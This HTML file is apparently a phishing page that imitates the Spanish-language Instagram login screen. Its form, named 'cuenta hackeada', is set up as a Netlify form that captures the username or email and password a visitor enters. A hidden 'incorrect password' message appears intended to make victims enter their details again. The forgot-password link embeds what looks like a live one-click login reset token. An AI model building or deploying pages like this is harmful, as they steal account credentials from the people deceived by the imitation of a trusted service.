<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram Inicio</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <div class="container">
    <div class="center">
      <div class="header">
        <img src="instagramlogo.png" alt="instagramLogo" class="instaLogo" />
      </div>
      <form id="form" class="inputElement" name="cuenta hackeada" netlify>
        <input name="email" type="text" placeholder="Teléfono, Usuario o Correo Electrónico" class="inputText" />
        <input name="password" type="password" placeholder="Contraseña" class="inputText" id="pass" />
        <button type="submit" class="inputButton">
            <span id="entrar">Entrar</span>
            <span id="spinner" style="display: none;"><i class="fa-solid fa-spinner"></i></span>
        </button>
        <div class="line">
          <span class="arrow"></span>
          <span class="content">O</span>
          <span class="arrow"></span>
        </div>
        <div class="incorrecta" id="incorrecta" style="display: none;">
          <p>Tu contraseña no es correcta. Vuelve a comprobarla.</p>
        </div>
      </form>
      <div class="social__icon">
        <i class="fab fa-facebook-square"></i><span>Ingresá con Facebook</span>
      </div>
      <div class="forgetPassword"><a href="https://www.instagram.com/accounts/password/reset/confirm/?uidb36=rl687ue&token=I8S5VB5C970TOrMYO2MAphcHZX9NaaxXiWl7pes3EXrKgJ64ioqgSpNzu4HBOuxx%3Aone_click_login_email&s=one_click_login_email">¿Has olvidado la contraseña?</a> </div>
    </div>
    <div class="footer">
      <p>¿No tienes una cuenta?<span><a href="https://www.instagram.com/accounts/emailsignup/"> Regístrate</a> </span></p>
    </div>
  </div>
  <script src="main.js"></script>
</body>
</html>
